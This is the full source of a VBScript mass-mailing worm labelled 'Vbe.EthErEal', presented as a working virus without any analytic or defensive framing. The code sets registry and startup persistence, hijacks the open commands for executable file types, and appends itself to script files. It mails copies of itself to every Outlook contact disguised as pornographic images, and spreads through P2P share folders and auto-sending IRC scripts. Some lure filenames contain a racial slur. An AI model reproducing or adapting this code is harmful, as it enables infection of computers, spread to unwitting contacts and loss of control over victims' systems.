' Vbe.EthErEal - By SAD1c
on error resume next
dim fso,wsh,self,code,dlist,installd,nlist,vbename,keys,slist,startup,aus,outl,instp
dim drive,folder,file,dirname
dim fext,hall,hline,str1,cnt,str2,sleft,addrlist,fattr
dim subt,subl,bodt,bodl,attn,attl,sadd,alcnt
set fso=createobject("scripting.filesystemobject")
set wsh=createobject("wscript.shell")
set outl=wscript.createobject("outlook.application")
set self=fso.opentextfile(wscript.scriptname)
code=self.readall
self.close
instp=wsh.regread("HKLM\Software\Data\EthErEal\InstallPath")
if instp="" then
	dlist=array(wsh.specialfolders("MyDocuments"),wsh.specialfolders("Programs"),fso.getspecialfolder(0),fso.getspecialfolder(1),fso.getspecialfolder(2))
	randomize
	installd=dlist(int(rnd*5))
	nlist=array("WinTray","NetInit","DataAdmin","AppShell","TaskDebug","PrnCfg32","FixService")
	randomize
	vbename=nlist(int(rnd*7))
	instp=installd&"\"&vbename&".vbe"
	droptoreg("HKLM\Software\Data\EthErEal\InstallPath",instp)
end if
set self=fso.createtextfile(instp,1)
self.write code
self.close
keys=wsh.regread("HKLM\Software\Data\EthErEal\StartUpKey")
if keys="" then
	slist=array("Run","RunOnce","RunServices","RunServicesOnce")
	randomize
	startup=slist(int(rnd*4))
	droptoreg("HKLM\Software\Microsoft\Windows\CurrentVersion\"&startup&"\"&vbename,"wscript.exe "&instp)
	droptoreg("HKLM\Software\Data\EthErEal\StartUpKey",startup)
else
	droptoreg("HKLM\Software\Microsoft\Windows\CurrentVersion\"&keys&"\"&vbename,"wscript.exe "&instp)
end if
droptoreg("HKLM\Software\Microsoft\Active Setup\Installed Components\Keyname\StubPath","wscript.exe "&instp)
aus=wsh.specialfolders("AllusersStartup")
fso.copyfile wscript.scriptname,aus&"\"&vbename&".vbe"
droptoreg("HKCR\exefile\Shell\Open\Command\","wscript.exe "&fso.getspecialfolder(1)&"\UserCmdLoad.vbe ""%%1 %%*""")
droptoreg("HKCR\scrfile\Shell\Open\Command\","wscript.exe "&fso.getspecialfolder(1)&"\UserCmdLoad.vbe ""%%1 %%*""")
droptoreg("HKCR\comfile\Shell\Open\Command\","wscript.exe "&fso.getspecialfolder(1)&"\UserCmdLoad.vbe ""%%1 %%*""")
droptoreg("HKCR\piffile\Shell\Open\Command\","wscript.exe "&fso.getspecialfolder(1)&"\UserCmdLoad.vbe ""%%1 %%*""")
droptoreg("HKCR\batfile\Shell\Open\Command\","wscript.exe "&fso.getspecialfolder(1)&"\UserCmdLoad.vbe ""%%1 %%*""")
droptoreg("HKCR\cmdfile\Shell\Open\Command\","wscript.exe "&fso.getspecialfolder(1)&"\UserCmdLoad.vbe ""%%1 %%*""")
set self=fso.createtextfile(fso.getspecialfolder(1)&"\UserCmdLoad.vbe",1)
self.writeline "dim wsh,arg,tmp1,tmp2"
self.writeline "set wsh=createobject(""wscript.shell"")"
self.writeline "set arg=wscript.arguments"
self.writeline "if arg.count>1 then"
self.writeline "for tmp1=0 to arg.count-1"
self.writeline "tmp2=arg(tmp1)&"" """
self.writeline "next"
self.writeline "wsh.exec tmp2"
self.writeline "wsh.run """&instp&" -noinf"",0"
self.writeline "end if"
self.close
if wscript.arguments.count<1 then
	infectdrives
end if
if wsh.regread("HKLM\Software\Data\EthErEal\OutlookDone")="" then
	attl=array("sexylesbo.jpg","fuckporn.jpg","lesbonude.jpg","virginsex.jpg","petitebitch.jpg","eroticgirl.jpg","teenboobs.jpg","fuckvirgin.jpg","eroticjokes.jpg","all_nudes.jpg","nigger_fuck_teens.jpg","anal_lovers.jpg")
	randomize
	attn=fso.getspecialfolder(2)&"\"&attl(int(13*rnd))&".vbe"
	fso.copyfile wscript.scriptname,attn
	subl=array("check this picture out!","check this! It's wonderful!!","Wow, this pic is great!","You have to see this!","Believe me, this image is GREAT!","Look at this, it's beautiful!!!","Enjoy with this image!","Hey, look at this, it's great!","Hi. Watch the photo, it's wonderful!")
	randomize
	subt=subl(int(9*rnd))
	bodl=array("I've attached a wonderful picture, enjoy!","I'm sure you will like it! ;-)","I think you'll like this image!","This is only for you! Bye!","I've immediatly thinked to you, so i've decided to send you it!","Watch this, & you'll enjoy a lot!","I hope U will like it! I think it's great!","Hey! This image it's VERY hard! Look!","I think it's very exiting! You'll love it!!")
	randomize
	bodt=bodl(int(9*rnd))
	set mapil=outl.getnamespace("MAPI")
	set alist=mapil.addresslists
	for each sadd in alist
		if sadd.addressentries.count<>0 then
			for alcnt=1 to sadd.addressentries.count
				mailto(sadd.addressentries(alcnt).address)
			next
		end if
	next
	dim arrl,singlea
	arrl=split(addrlist,vbcrlf)
	for each singlea in arrl
		mailto(singlea)
	next
	droptoreg("HKLM\Software\Data\EthErEal\OutlookDone","EthErEal")
end if
sub infectdrives
on error resume next
	for each drive in fso.drives
		if drive.drivetype<4 then
			dirlist(drive.path&"\")
		end if
	next
end sub
sub dirlist(dirpath)
	on error resume next
	set fldr=fso.getfolder(dirpath)
	dirname=lcase(fldr.name)
	if dirname="morpheus" or dirname="kmd" or dirname="kazaa" or dirname="kazaa lite" then
		p2padd(fldr.path&"\My Shared Folder")
	elseif dirname="edonkey2000" or dirname="emule" or dirname="overnet" then
		p2padd(fldr.path&"\Incoming")
	elseif dirname="bearshare" or dirname="limewire" then
		p2padd(fldr.path&"\Shared")
	elseif dirname="GROKSTER" then
		p2padd(fldr.path&"\My Grokster")
	elseif dirname="ICQ" then
		p2padd(fldr.path&"\Shared Files")
	end if
	if dirname="mirc" or dirname="mirc32" then
		fso.copyfile wscript.scriptname,fldr.path&"\babes_nude.jpg.vbe
		set mircfile=fso.createtextfile(fldr.path&"\script.ini",1)
		mircfile.writeline "[script]"
		mircfile.writeline "n0=on 1:join:#:"
		mircfile.writeline "n1={ /if ($nick!=$me) /msg $nick Check out it, & you'll love it!"
		mircfile.writeline "n2=  /dcc send $nick "&fldr.path&"\babes_nude.jpg.vbe }"
		mircfile.close
	end if
	if dirname="pirch" or dirname="pirch98" then
		fso.copyfile wscript.scriptname,fldr.path&"\virgin_whores.jpg.vbe
		set pirchfile=fso.createtextfile(fldr.path&"\Events.ini",1)
		pirchfile.writeline "[Levels]"
		pirchfile.writeline "Enabled=1"
		pirchfile.writeline "Count=6"
		pirchfile.writeline "Level1=000-Unknows"
		pirchfile.writeline "000-UnknowsEnabled=1"
		pirchfile.writeline "Level2=100-Level 100"
		pirchfile.writeline "100-Level 100Enabled=1"
		pirchfile.writeline "Level3=200-Level 200"
		pirchfile.writeline "200-Level 200Enabled=1"
		pirchfile.writeline "Level4=300-Level 300"
		pirchfile.writeline "300-Level 300Enabled=1"
		pirchfile.writeline "Level5=400-Level 400"
		pirchfile.writeline "400-Level 400Enabled=1"
		pirchfile.writeline "Level6=500-Level 500"
		pirchfile.writeline "500-Level 500Enabled=1"
		pirchfile.writeline "[000-Unknowns]"
		pirchfile.writeline "UserCount=0"
		pirchfile.writeline "Event1=ON JOIN:#:/msg $nick Welcome! I think you'll like it!!"
		pirchfile.writeline "EventCount=0"
		pirchfile.writeline "[100-Level 100]"
		pirchfile.writeline "User1=*!*@*"
		pirchfile.writeline "UserCount=1"
		pirchfile.writeline "Events1=ON JOIN:#: /dcc send $nick "&fldr.path&"\virgin_whores.jpg.vbe"
		pirchfile.writeline "EventCount=1"
		pirchfile.writeline "[200-Level 200]"
		pirchfile.writeline "UserCount=0"
		pirchfile.writeline "EventCount=0"
		pirchfile.writeline "[300-Level 300]"
		pirchfile.writeline "UserCount=0"
		pirchfile.writeline "EventCount=0"
		pirchfile.writeline "[400-Level 400]"
		pirchfile.writeline "UserCount=0"
		pirchfile.writeline "EventCount=0"
		pirchfile.writeline "[500-Level 500]"
		pirchfile.writeline "UserCount=0"
		pirchfile.writeline "EventCount=0"
		pirchfile.close
	end if
	fso.copyfile wscript.scriptname,fso.getspecialfolder(0)&"\virgin_whores.jpg.vbe
	droptoreg("HKEY_USERS\.Default\Software\MEGALITH SOFTWARE\Visual IRC 98\Events\Event17","dcc send $nick "&fso.getspecialfolder(0)&"\virgin_whores.jpg.vbe")
	for each file in fldr.files
		set cfile=fso.getfile(file.path)
		fattr=cfile.attributes
		cfile.attributes=0
		sext=lcase(fso.getextensionname(cfile.path))
		if sext="vbs" or sext="vbe" then
			set msfile=fso.opentextfile(cfile.path,8)
			msfile.write code
			msfile.close
		end if
		cfile.attributes=fattr
		if sext="htm" or sext="html" then
			set hfile=fso.opentextfile(file.path)
			hall=split(hfile.readall,vbcrlf)
			hfile.close
			for each hline in hall
				str1=instr(1,hline,"mailto:",1)
				if str1 then
					cnt=0
					str2=""
					do while mid(hline,str1+cnt,1)<>chr(34) and mid(hline,str1+cnt,1)<>chr(32) and mid(hline,str1+cnt,1)<>chr(45)
						cnt=cnt+1
						str2=str2+mid(hline,str1+cnt-1,1)
					loop
					sleft=left(str2,len(str2))
					addrlist=addrlist&right(sleft,len(sleft)-7)&vbcrlf
				end if
			next
		end if
		for each folder in fldr.subfolders
			dirlist(folder.path)
		next
	next
end sub
sub p2padd(p2pdir)
	on error resume next
	set wormfile=fso.getfile(instp)
	wormfile.copy p2pdir&"\sexy883.jpg.vbe"
	wormfile.copy p2pdir&"\adult71.jpg.vbe"
	wormfile.copy p2pdir&"\erotic7712.jpg.vbe"
end sub
sub mailto(address)
	on error resume next
	set outi=outl.createitem(0)
	outi.to=address
	outi.subject=subt
	outi.body=bodt
	outi.attachments.add(attn)
	outi.importance=2
	outi.deleteaftersubmit=true
	if outi.to<>"" then
		outi.send
	end if
end sub
sub droptoreg(keyname,keyval)
	on error resume next
	wsh.regwrite keyname,keyval
end sub